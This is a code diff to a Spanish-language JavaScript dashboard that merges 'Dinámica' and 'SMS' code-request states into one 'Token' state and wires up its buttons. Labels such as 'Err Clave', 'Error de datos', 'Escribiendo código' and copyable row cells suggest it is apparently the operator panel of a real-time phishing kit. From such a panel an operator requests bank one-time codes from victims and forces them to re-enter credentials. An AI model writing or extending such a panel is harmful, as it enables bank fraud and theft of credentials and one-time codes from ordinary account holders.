@@ -23,12 +23,9 @@ function statusLabel(state) {
   if (state === 'done') return 'Listo'
   if (state === 'error-login') return 'Error de datos'
   if (state === 'error') return 'Error'
-  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
-  if (state === 'waiting-sms') return 'SMS solicitado'
-  if (state === 'received-dinamica') return 'Dinámica'
-  if (state === 'received-sms') return 'SMS'
-  if (state === 'error-dinamica') return 'Error Dinámica'
-  if (state === 'error-sms') return 'Error SMS'
+  if (state === 'waiting-token') return 'Token solicitado'
+  if (state === 'received-token') return 'Token'
+  if (state === 'error-token') return 'Error Token'
   if (state === 'typing') return 'Escribiendo código'
   return 'Nuevo'
 }
@@ -39,20 +36,18 @@ function badgeClass(state) {
   }
   if (
     state === 'waiting' ||
-    state === 'waiting-dinamica' ||
-    state === 'waiting-sms'
+    state === 'waiting-token'
   ) {
     return 'badge badge--wait'
   }
   if (state === 'active') return 'badge badge--hola'
   if (state === 'done') return 'badge badge--done'
-  if (state === 'received-dinamica' || state === 'received-sms') {
+  if (state === 'received-token') {
     return 'badge badge--login'
   }
   if (
     state === 'error-login' ||
-    state === 'error-dinamica' ||
-    state === 'error-sms' ||
+    state === 'error-token' ||
     state === 'error'
   ) {
     return 'badge badge--error'
@@ -144,11 +139,9 @@ function createRow(row) {
     <td>
       <div class="row-actions">
         <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
-        <button type="button" class="btn btn--ok" data-action="dinamica" disabled style="opacity: 0.4; cursor: not-allowed;">Dinámica</button>
-        <button type="button" class="btn btn--ok" data-action="sms" disabled style="opacity: 0.4; cursor: not-allowed;">SMS</button>
-        <button type="button" class="btn btn--error" data-action="error-dinamica" disabled style="opacity: 0.4; cursor: not-allowed;">Err Dinámica</button>
-        <button type="button" class="btn btn--error" data-action="error-sms" disabled style="opacity: 0.4; cursor: not-allowed;">Err SMS</button>
-        <button type="button" class="btn btn--done" data-action="done" disabled style="opacity: 0.4; cursor: not-allowed;">Listo</button>
+        <button type="button" class="btn btn--ok" data-action="token">Token</button>
+        <button type="button" class="btn btn--error" data-action="error-token">Err Token</button>
+        <button type="button" class="btn btn--done" data-action="done">Listo</button>
       </div>
     </td>
   `
@@ -156,6 +149,22 @@ function createRow(row) {
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-login', 'error-login')
     playErrorSound()
+  })
+  tr.querySelector('[data-action="token"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-token') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-token', 'token')
+  })
+  tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-token', 'error-token')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'done', 'done')
+    playSuccessSound()
   })
 
   tr.querySelectorAll('td.copyable').forEach((td) => {
@@ -220,10 +229,8 @@ function updateRow(tr, row) {
   tr.querySelector('.col-status').innerHTML =
     `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`
 
-  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
-  const smsBtn = tr.querySelector('[data-action="sms"]')
-  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
-  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
+  const tokenBtn = tr.querySelector('[data-action="token"]')
+  tokenBtn?.classList.toggle('is-on', row.state === 'waiting-token')
   tr.classList.toggle('is-waiting', row.state === 'waiting')
 }
 
